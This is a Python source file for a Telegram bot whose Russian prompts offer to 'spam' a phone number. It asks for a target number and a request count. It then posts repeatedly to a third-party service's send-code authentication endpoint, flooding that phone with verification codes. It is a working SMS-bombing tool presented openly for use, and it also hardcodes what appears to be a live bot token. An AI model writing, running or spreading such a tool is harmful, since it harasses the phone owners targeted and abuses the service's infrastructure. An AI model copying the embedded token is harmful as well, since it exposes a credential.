import asyncio
import logging
import time
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message
import os

TOKEN = "8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE"
API_URL = "https://cabinet.presscode.app/api/auth/send-code"
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "X-Requested-With": "XMLHttpRequest"
}

class SpamState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

bot = Bot(token=TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start_cmd(message: Message):
    await message.answer("Отправь /spam чтобы начать спам запросами на номер.")

@dp.message(Command("spam"))
async def spam_cmd(message: Message, state: FSMContext):
    await state.set_state(SpamState.waiting_phone)
    await message.answer("Введи номер телефона в формате +77771234567")

@dp.message(SpamState.waiting_phone)
async def phone_received(message: Message, state: FSMContext):
    phone = message.text.strip()
    if not phone.startswith('+') or len(phone) < 10:
        await message.answer("Некорректный номер. Попробуй снова.")
        return
    await state.update_data(phone=phone)
    await state.set_state(SpamState.waiting_count)
    await message.answer("Введи количество запросов (число)")

@dp.message(SpamState.waiting_count)
async def count_received(message: Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count <= 0:
            await message.answer("Количество должно быть положительным.")
            return
    except ValueError:
        await message.answer("Введи целое число.")
        return
    data = await state.get_data()
    phone = data.get("phone")
    await state.clear()
    await message.answer(f"Начинаю спам на {phone} в количестве {count} запросов. Жди...")
    asyncio.create_task(spam_worker(message, phone, count))

async def spam_worker(message: Message, phone: str, count: int):
    await message.answer("Спам запущен. Каждый запрос будет логироваться.")
    session = requests.Session()
    session.headers.update(HEADERS)
    for i in range(count):
        try:
            resp = session.post(API_URL, json={"phone": phone}, timeout=10)
            if resp.status_code == 200:
                await message.answer(f"[{i+1}/{count}] Успешно (200)")
            else:
                await message.answer(f"[{i+1}/{count}] Ошибка {resp.status_code}: {resp.text[:50]}")
        except Exception as e:
            await message.answer(f"[{i+1}/{count}] Исключение: {str(e)[:50]}")
        await asyncio.sleep(5)
    await message.answer("Спам завершён.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    dp.run_polling(bot)
